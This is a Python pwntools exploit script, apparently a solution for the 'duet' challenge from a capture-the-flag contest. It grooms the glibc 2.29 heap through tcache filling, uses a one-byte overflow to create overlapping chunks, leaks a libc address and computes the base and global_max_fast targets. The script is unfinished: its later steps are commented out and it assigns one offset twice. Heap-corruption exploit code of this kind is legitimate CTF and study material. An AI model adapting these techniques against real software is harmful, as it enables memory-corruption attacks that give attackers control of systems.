from pwn import *
#envi={"LD_PRELOAD":"/media/sf_kalishared/livectfs/RCTF2020/note/libc-2.29.so"}
#target=process(['/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.29.so','./duet'],env=envi)
#libc=ELF("/media/sf_kalishared/livectfs/RCTF2020/note/libc-2.29.so")
target=process('./duet')
libc=ELF('./duet').libc


def init(option,c):
        print(target.recvuntil(": "))
        target.sendline(str(option))
        print(target.recvuntil("Instrument: "))
        target.sendline(c)

def calloc(c,size,data):
        init(1,c)
        print(target.recvuntil("Duration: "))
        target.sendline(str(size))
        print(target.recvuntil("Score: "))
        target.send(data)       
        
def free(c):
        init(2,c)
        
def view(c):
        init(3,c)
        print(target.recvuntil(": "))
        leak=target.recvline().strip("\n")
        print(leak)
        return leak
        
def yolo(size):
        print(target.recvuntil(": "))
        target.sendline(str(5))
        print(target.recvuntil(": "))
        target.sendline(str(size))
c1="\xe7\x90\xb4\x00"
c2="\xe7\x91\x9f\x00"

for i in range(7):
        calloc(c1,0xe8,"A"*0xe8)
        free(c1)
for i in range(7):
        calloc(c1,0x88,"A"*0x88)
        free(c1)


calloc(c1,0x88,"A"*0x88)
calloc(c2,0x4e8,"A"*0x3f8+p64(0xf1)+"B"*0xe8)
free(c1)
yolo(0x01)
calloc(c1,0x2f8,"B"*0xe0+p64(0x4f0)+p64(0x211)+"\x00"*(0x2f8-0xf0))
free(c2)
for i in range(4):
        calloc(c2,0xf8,"A"*0xf8)
        free(c2)

libc_leak=u64(view(c1)[0:6].ljust(8,"\x00"))
libc_base=libc_leak-libc.symbols["__malloc_hook"]-0x70
libc_global_max_fast=libc_base+0x1e7600
libc_global_max_fast=libc_base+0x1bfb78

print(hex(libc_base))
print(hex(libc_global_max_fast))
pause()
#calloc(c2,0x88,"A"*8+p64(libc_global_max_fast-0x10)+"\x00"*0x78)
#free(c1)
#calloc(c2,0xe8,"B"*0xe8)
target.interactive()